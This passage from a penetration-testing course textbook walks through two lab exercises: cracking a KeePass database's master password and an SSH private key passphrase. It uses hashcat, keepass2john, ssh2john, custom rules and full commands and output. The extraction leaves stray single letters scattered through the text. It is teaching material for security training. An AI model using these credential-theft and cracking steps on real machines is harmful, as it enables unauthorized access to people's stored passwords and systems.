terminated. Instead of holding out hope for success in an overly-long prospective cracking
session, we should consider alternative attack vectors or invest in a hardware upgrade or a cloud-
based machine instance.
The fourth step considers wordlist preparation. In nearly all cases we should mutate our wordlist
and perform a rule-based attack, instead of a straight dictionary attack. In this step, we should
investigate potential password policies and research other password vectors, including online
password leak sites. Without this, we may need to run multiple wordlists with (or without) pre-
existing rules for a broad coverage of possible passwords.
After all the preparation, we can start our tool and begin the cracking process. At this point, we
must take special care in copying and pasting our hashes. An extra space or a newline could
render our efforts worthless. In addition, we should be sure of the yhash type we are using. For
example, hashid can’t automatically determine if b08ff247dc7c5658ff64c53e8b0db462 is MD2,
MD4, or MD5. An incorrect choice will obviously waste time. We can avoid this situation by
k
double-checking the results with other tools and doing additional research.
We’ll follow this methodology in the upcoming demonstrsations to reinforce the important aspects
and details of the cracking process. The best way to improve our results in this often-lengthy
process is to operate with focus and structure. o
13.2.4 Password Manager
n
Password managers create and store passwords for different services, protecting them with a
master password. This master password grants access to all passwords held by the password
i
manager. Users often copy and paste these passwords from the password manager or use an
z
auto-fill function tied to a browser. Examples of popular password managers are 1Password633
and KeePass.634 This type of software can assist users who are often forced to maintain many,
often complex passwords, bDut it can also introduce risk into an organization.
In this section we’ll demonstrate a very common penetration test scenario. Let’s assume we have
gained access to a client workstation running a password manager. In the following
demonstration, we’ll extract the password manager’s database, transform the file into a format
usable by Hashcat, and crack the master database password.
Let’s begin by connecting to the SALESWK01 machine (192.168.50.203) over RDP. Assuming
we’ve obtained credentials for the jason user (lab), we’ll log in and after a successful connection,
we’ll gain access to the system desktop.
Once connected, we’ll check which programs are installed on the system. There are many ways to
search for installed programs, but since we have GUI access, we’ll use the Apps & features
function of Windows, which is the most straight-forward approach. We’ll click on the Windows
icon, type “Apps”, select Add or remove programs and scroll down to review all installed programs.
633 (1Password, 2022), https://1password.com/
634 (KeePass, 2022), https://keepass.info/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 399
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
Figure 213: KeePass in installed programs list
The list shows us that KeePass is installed on the system. If we were unfamiliar with this
n
program, we would research it, eventually discovering that the KeePass database is stored as a
.kdbx file and that there may be more than one database on the system. For example, a user may
maintain a personal database and ian organization may maintain a department-level database.
Our next step is to locate the datazbase files by searching for all .kdbx files on the system.
Let’s use PowerShell with the Get-ChildItem635 cmdlet to locate files in specified locations. We’ll
use -Path C:\ to search the Dwhole drive. Next, we’ll use -Include to specify the file types we want to
include, -File and -Recurse arguments to get a list of files and search in subdirectories. Finally
we’ll set -ErrorAction to SilentlyContinue to silence errors and continue execution.
PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction
SilentlyContinue
Directory: C:\Users\jason\Documents
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 5/30/2022 8:19 AM 1982 Database.kdbx
Listing 274 - Searching for KeePass database files
The output reveals a database file in the jason user’s Documents folder.
635 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-
childitem
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 400
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
Figure 214: KeePass doatabase in Explorer
We’ll transfer this file to our Kali system in preparation for the following steps.
n
We have now completed the first step of the cracking methodology and can proceed to the next
step, transforming the hash into a format our cracking tool can use.
i
The JtR suite includes various traznsformation scripts like ssh2john636 and keepass2john,637 which
can format a broad range of different file formats, and they are installed by default on our Kali
machine. We can also use these scripts to format hashes for Hashcat.
D
Let’s use the keepass2john script to format the database file and save the output to
keepass.hash.
kali@kali:~/passwordattacks$ ls -la Database.kdbx
-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx
kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash
kali@kali:~/passwordattacks$ cat keepass.hash
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9ae
c6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd
843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3
ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
Listing 275 - Using keepass2john to format the KeePass database for Hashcat
636 (Github, 2022), https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py
637 (Github, 2022), https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 401
Made in Morocco
Penetration Testing with Kali Linux
The Listing above shows the resulting hash of the KeePass database stored in keepass.hash.
Before we can work with the resulting hash, we need to further modify it.
In our case, the JtR script prepended the filename Database to the hash. The script does this to
act as the username for the target hash. This is helpful when cracking database hashes, since we
want the output to contain the corresponding username and not only the password. Since
KeePass uses a master password without any kind of username, we need to remove the
“Database:” string with a text editor.
After removing the “Database:” string the hash is in the correct format for Hashcat:
kali@kali:~/passwordattacks$ cat keepass.hash
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0
bfd787898d8dcd4d463ee768e...
Listing 276 - Correct hash format for Hashcat without “Database:”
y
We’re nearly ready to start the cracking process, but we need to determine the hash type for
KeePass. We could look it up in the Hashcat Wiki,638 or grep kthe hashcat help output as shown
below:
s
kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
Listing 277 - Finding the modoe of KeePass in Hashcat
The output of the grep command shows that the correct mode for KeePass is 13400.
n
Let’s skip step three (cracking time calculation) since this is a simple example and won’t take
long, and move on to step four to prepare our wordlist. We’ll use one of the Hashcat-provided
rules (rockyou-30000.rule), as mentioined earlier, combined with the rockyou.txt wordlist.
z
This rule file is especially effective with rockyou.txt, since it was created for it.
As we enter step five, we’veD prepared everything for our password attack. Let’s use hashcat with
the updated arguments and start cracking.
kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --
force
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0
bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee30
9d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c35
35689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
Listing 278 - Cracking the KeePass database hash
After several seconds Hashcat successfully cracked the hash, and discovered the KeePass
master password of “qwertyuiop123!”. Let’s run KeePass over our RDP connection and when
prompted, enter the password.
638 (Hashcat Wiki, 2022), https://hashcat.net/wiki/doku.php?id=example_hashes
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 402
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
Figure 215: Prompt for Master Password in KeePass
n
Very nice! We opened KeePass with the cracked password. Now we have access to all the user’s
stored passwords!
i
z
D
Figure 216: Password list after successful entering the Master Password
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 403
Made in Morocco
Penetration Testing with Kali Linux
In this section, we obtained a KeePass database file, transformed it for Hashcat, and cracked the
password. In the next section, we’ll demonstrate how to crack the passphrase of an SSH private
key in order to use it to access a target system.
13.2.5 SSH Private Key Passphrase
In this section we will focus on cracking SSH private key passphrases.
Even though SSH private keys should be kept confidential, there are many scenarios in which
these files could be compromised. For example, if we gain access to a web application via a
vulnerability like Directory Traversal, we could read files on the system. We could use this to
retrieve a user’s SSH private key. However, when we try to use it to connect to the system, we
would be prompted for a passphrase. To gain access, we’ll need to crack the passphrase.
Let’s demonstrate this scenario and how to use the cracking methodology we discussed to crack
y
the passphrase of a private key. When we used a dictionary attack on the BRUTE HTTP login
form, we gained access to a web-based file manager that hosted an SSH private key.
k
Let’s browse another web service, which (for this demonstration) is located at
http://192.168.50.201:8080 and log in with a username osf user and a password of 121212.
o
n
i
z
D
Figure 217: Directory Listing of TinyFileManager
This web service is similar to the previous TinyFileManager example except that the main
directory now contains the two additional files id_rsa and note.txt. Let’s download both of them to
our Kali machine and save them to our passwordattacks directory. First, we’ll review the contents
of note.txt.
kali@kali:~/passwordattacks$ cat note.txt
Dave's password list:
Window
rickc137
dave
superdave
megadave
umbrella
Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital
letter and a special character
Listing 279 - Contents of note.txt
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 404
Made in Morocco
Penetration Testing with Kali Linux
The output shows that this note contains dave’s password list in plaintext. Wow! This is a
potential gold mine of information. In a real-world situation, we would need to perform
significantly more information gathering (including learning the actual username associated with
each password), but for purposes of demonstration we’ll run with this!
Let’s try to use the private key id_rsa for the newly-identified user dave in an SSH connection. For
this, we must modify the permissions of the downloaded private key. The SSH port used in this
example is 2222. We will try each of these passwords as the passphrase for the SSH private key.
Note that the ssh program will not echo the passphrase.
kali@kali:~/passwordattacks$ chmod 600 id_rsa
kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 PI:EMAIL
The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be
established.
y
ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fikngerprint])? yes
Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known
hosts.
s
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa': o
PI:EMAIL's password:
kali@kali:~/passwordattacks$ ssh -i id_nrsa -p 2222 PI:EMAIL
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsai':
Listing 280z - SSH connection attempts with the private key
None of the passwords from the text file worked for this passphrase. However, in a real
penetration test we wouldD keep these passwords on hand for various other vectors including
spray attacks, or attacks against a dave user on other systems. However, we still need a
passphrase to use dave’s private key.
According to the note.txt file, a new password policy was enabled in January 2022. There’s a high
probability that dave has a passphrase that satisfies the new password policy.
Following the cracking methodology, our next step is to transform the private key into a hash
format for our cracking tools. We’ll use the ssh2john transformation script from the JtR suite and
save the resulting hash to ssh.hash.
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d76310
00000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883
fcdf592feb7000000100000000100000197000000077373682...
Listing 281 - Using ssh2john to format the hash
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 405
Made in Morocco
Penetration Testing with Kali Linux
Within this output, “$6$” signifies SHA-512.639 As before, we’ll remove the filename before the first
colon. Then, we’ll determine the correct Hashcat mode.
kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh"
...
10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1 | Enterprise Application
Software (EAS)
22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$) | Private Key
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Key
22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$) | Private Key
22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$) | Private Key
22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$) | Private Key
Listing 282 - Determine the correct mode for Hashcat
The output indicates that “$6$” is mode 22921.
y
Now, let’s proceed in our methodology and create a rule file and prepare a wordlist to crack the
hash. We’ll again review note.txt to determine which rules we should create and which passwords
k
we’ll include in the wordlist.
kali@kali:~/passwordattacks$ cat note.txt s
Dave's password list:
o
Window
rickc137
dave
n
superdave
megadave
umbrella
i
z
Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital
letter and a special character
D
Listing 283 - Contents of note.txt to determine rules and wordlist
Based on this, we can begin to create our rule file. We must include three numbers, at least one
capital letter, and at least one special character.
We notice that dave used “137” for the three numbers in the “rickc137” password. Furthermore,
the “Window” password starts with a capitalized letter. Let’s use a rule function to make the first
letter upper case. There is no special character included in any of the listed passwords. For our
first cracking attempt, we’ll just use the most common special characters “!”, “@”, and “#”, since
they are the first three special characters when typing them from the left side of many keyboard
layouts.
Based on the analysis, we’ll create our rules. We’ll use c for the capitalization of the first letter and
$1 $3 $7 for the numerical values. To address the special characters, we’ll create rules to append
the different special characters $!, $@, and $#.
kali@kali:~/passwordattacks$ cat ssh.rule
c $1 $3 $7 $!